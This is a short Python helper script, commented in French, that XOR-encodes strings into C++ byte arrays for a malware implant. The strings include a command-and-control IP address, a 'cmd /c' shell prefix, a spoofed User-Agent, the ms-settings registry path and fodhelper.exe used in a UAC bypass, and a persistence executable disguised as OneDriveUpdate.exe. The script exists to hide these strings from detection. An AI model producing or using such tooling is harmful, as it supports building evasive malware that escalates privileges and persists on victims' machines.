def xor_string(text, key):
    output = "{"
    for char in text:
        # On fait un XOR entre le caractère et la clé
        encrypted_char = ord(char) ^ key
        output += f"0x{encrypted_char:02x}, "
    output = output.rstrip(", ") + "}"
    return output

# La clé de chiffrement (on garde la même pour tout le C++)
KEY = 0x3B  # Clé arbitraire (';')

print(f"--- Clé utilisée : 0x{KEY:02x} ---")
print(f"// IP C2 (192.168.101.1) :")
print(f"char S_IP[] = {xor_string('192.168.101.1', KEY)};")

print(f"\n// cmd /c :")
print(f"char S_CMD[] = {xor_string('cmd /c ', KEY)};")

print(f"\n// User-Agent :")
print(f"char S_UA[] = {xor_string('Mozilla/5.0', KEY)};")

print(f"\n// Registry UAC :")
print(f"char S_REG[] = {xor_string('Software\\Classes\\ms-settings\\Shell\\Open\\command', KEY)};")

print(f"\n// Fodhelper :")
print(f"char S_FOD[] = {xor_string('fodhelper.exe', KEY)};")

print(f"\n// Persistance :")
print(f"char S_PER[] = {xor_string('\\OneDriveUpdate.exe', KEY)};")